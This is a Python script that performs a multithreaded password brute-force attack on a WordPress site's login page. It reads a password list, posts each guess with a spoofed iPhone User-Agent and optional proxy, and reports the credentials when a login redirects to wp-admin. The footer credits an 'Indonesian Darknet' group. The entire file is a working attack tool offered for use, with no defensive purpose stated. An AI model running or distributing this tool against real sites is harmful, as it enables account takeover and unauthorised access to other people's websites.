#!/bin/env python3

import os
import re
import ssl
import time
import urllib.parse
import urllib.request

from datetime import datetime
from argparse import FileType
from argparse import SUPPRESS
from argparse import ArgumentParser
from concurrent.futures import as_completed
from concurrent.futures import ThreadPoolExecutor

BANNER = """\
▖  ▖▄▖  ▄▖▖▖▄▖▖▖▄▖▄▖
▌▞▖▌▙▌  ▙▖▌▌▌ ▙▘▙▖▙▘
▛ ▝▌▌ ▄▖▌ ▙▌▙▖▌▌▙▖▌▌
"""

def printBanner(start=False):
    current_time = ""
    if start:
        current_time = "[*] starting at " + datetime.now().strftime("%H:%M:%S (%d-%m-%Y)")
    print(BANNER + current_time + "\n\n")

def sliceList(content):
    return [line.strip() for line in content.readlines()]

def login(url, username, password, timeout=5, proxy=None):
    url = urllib.parse.urljoin(url, "/wp-login.php/")
    form = f"log={username}&pwd={password}".encode("utf-8")
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        request = urllib.request.Request(url, data=form, headers=headers)
        
        if proxy:
            request.set_proxy(proxy, ["http", "https"])
            
        with urllib.request.urlopen(request, timeout=timeout, context=ssl.create_default_context()) as response:
            return password if re.search("wp-admin", response.url) else False
            
    except Exception as error:
        print(f"[ERROR] {error}")
        os._exit(1)

if __name__ == "__main__":
    parser = ArgumentParser(
        usage="python %(prog)s [options]",
        epilog="Copyright © 2021 Andrew - Powered by Indonesian Darknet",
    )
    target = parser.add_argument_group("target arguments")
    target.add_argument("-t", "--target", dest="url", metavar="", help="url of the target", required=True)
    target.add_argument("-u", "--username", dest="usr", metavar="", default="admin", help="username (default: admin)")
    target.add_argument("-p", dest="pwd_list", type=FileType('r', encoding="utf-8"), help=SUPPRESS)
    request = parser.add_argument_group()
    request.add_argument("--thread", metavar="", type=int, default=5, help="threads count (default: 5)")
    args = parser.parse_args()

    printBanner(True)
    
    if not args.pwd_list:
        parser.error("the following arguments are required: -p/--p")
    
    passwords = sliceList(args.pwd_list)
    print(f"Loaded {len(passwords)} passwords to test")
    
    try:
        print("Testing connection to target...")
        urllib.request.urlopen(args.url, timeout=5, context=ssl.create_default_context())
        
        start_time = time.time()
        found = False
        last_print = 0
        print_interval = 500
        
        print(f"Starting brute force with {args.thread} threads...")
        
        with ThreadPoolExecutor(max_workers=args.thread) as executor:
            futures = {executor.submit(login, args.url, args.usr, pwd): pwd for pwd in passwords}
            
            for i, future in enumerate(as_completed(futures)):
                password = futures[future]
                
                # Выводим прогресс каждые print_interval итераций
                if (i+1) % print_interval == 0 or (i+1) == len(passwords):
                    print(f"Testing password {i+1}/{len(passwords)}", end="\r")
                    last_print = i+1
                
                result = future.result()
                if result:
                    found = True
                    print(f"\n\033[31mFound credentials! {args.usr}:{password}\033[0m")
                    break
                    
        if not found:
            print(f"\nTested {len(passwords)} passwords, no valid credentials found")
            
        print(f"Time taken: {int(time.time() - start_time)} seconds")
        
    except Exception as e:
        print(f"[ERROR] {e}")
